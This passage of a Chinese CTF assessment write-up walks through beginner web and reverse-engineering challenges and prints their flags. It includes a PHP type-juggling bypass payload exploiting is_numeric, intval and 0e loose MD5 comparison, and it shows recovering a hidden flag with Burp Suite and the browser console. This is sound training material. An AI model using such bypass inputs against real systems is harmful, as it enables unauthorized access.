成功迈开第一步，现在再看第二层，我们需要绕过函数**is_numeric**的判断，那么说明用post传参的passwd不能被识别为数字字符串，那可以在数字后面加上字母或者符号来绕过，我用的是：`passwd=1433223ssy`，同时num需要满足**intval($num) < 20231002 && intval($num + 1)**的条件，上网搜了相关博客，讲只要在num的值中输入字母e，intval函数的返回值就只会是科学计数法前面的一个数，而对于科学计数法加数字则会返回科学计数法的数值，这边还要注意一点，就是返回的科学计数法的数值不能超过计算机的算力上限，不然无法提交成功（我一开始就是因为输的科学计数法算的值太大一直没能提交成功），那么经过计算，用`num=2e8`，这样算出来的刚好符合条件。最后一个要求就是md5弱比较绕过，可以使用0e开头的科学计数法绕过，我用的是网上找的一个值：`0e215962017`，那么最终组合起来就是：`passwd=1433223ssy&num=2e8&md5=0e215962017`

![image-20231014145602097](Dozer第一次考核/image-20231014145602097.png)

成功绕过所有的障碍，flag为：`Dozer{0478000ebfb949598b003aa158d85592}`。

### 8.你会用burpsuit吗

![image-20231014145957475](Dozer第一次考核/image-20231014145957475.png)

这题考察了如何使用bp对网站进行抓包，基本抓出来应该也做出来了。

登进网站是这样的页面，使用bp进行抓包。

![image-20231014150234539](Dozer第一次考核/image-20231014150234539.png)

打开bp，新建扫描任务：

![image-20231014150422875](Dozer第一次考核/image-20231014150422875.png)

把网址输进去开始扫描，扫描结束后打开目标：

![image-20231014150532641](Dozer第一次考核/image-20231014150532641.png)

可以看到**X-flag-Header**这玩意，一看发现是jsfuck加密，用在线网站翻译一下：

![image-20231014150635712](Dozer第一次考核/image-20231014150635712.png)

给了我们php文件，进去应该就是flag了：

![image-20231014150722630](Dozer第一次考核/image-20231014150722630.png)



得到flag：`Dozer{155294ed03574eb7af93691e4543320b}`。

### 9.house

![image-20231014150816735](Dozer第一次考核/image-20231014150816735.png)

进去玩了会游戏直接卡关了，打开F12去查源代码，发现了在min文件夹中有一个**flag.min.js**文件，估计flag就与它相关。

![image-20231014151027613](Dozer第一次考核/image-20231014151027613.png)

应该是关于怎么给我们flag的，我看到最下面有个代码叫：`flag.getFlag()`，那是不是可以直接把flag给我？去控制台输一下：

![image-20231014151231377](Dozer第一次考核/image-20231014151231377.png)

直接把flag给我了，flag为：`Dozer{The_house_is_interesting}`。

这题还有个做法，就是直接用unicode编码进行翻译：

![image-20231015001711849](Dozer第一次考核/image-20231015001711849.png)

![image-20231015001633205](Dozer第一次考核/image-20231015001633205.png)

同样能得到flag。

## REVERSE

### 1.ReallyEZre

![image-20231003142338166](Dozer第一次考核/image-20231003142338166.png)

这题下出来是一个cpp代码文件，我一直整不明白，最后根据这两条，通过ascii码手搓出来了。

![image-20231003142618865](Dozer第一次考核/image-20231003142618865.png)

`Fq|gt}ygneqogavqaEartkogt`这段乱码对照ascii码表，每个向前**-2**，就可以得到本题的flag：`Dozer{welcome_to_C_primer}`。

### 2.HelloIDA

![image-20231003142813667](Dozer第一次考核/image-20231003142813667.png)

这道题比想象的简单多了，直接使用IDA打开题目给的.exe文件就好了，进去再按个TAB键，就可以查到伪代码。

![image-20231003143206349](Dozer第一次考核/image-20231003143206349.png)

flag就在这：`Dozer{D0_Y0u_L1ke_Reverse_hhh}`。

### 3.maze

![image-20231014200718791](Dozer第一次考核/image-20231014200718791.png)

本题打开附件中的程序为一个迷宫，按照最短路径是这么走：

![image-20231014201322041](Dozer第一次考核/image-20231014201322041.png)

用wasd来操控的话，那么path为`ddddddssssaaassssssssssdddwwdddddwwwwwwddddddsssdd`，用md5加密得到：`44E2EF0ED91BA496476E316CA5DEEFB2`

那么flag为：`Dozer{44E2EF0ED91BA496476E316CA5DEEFB2}`。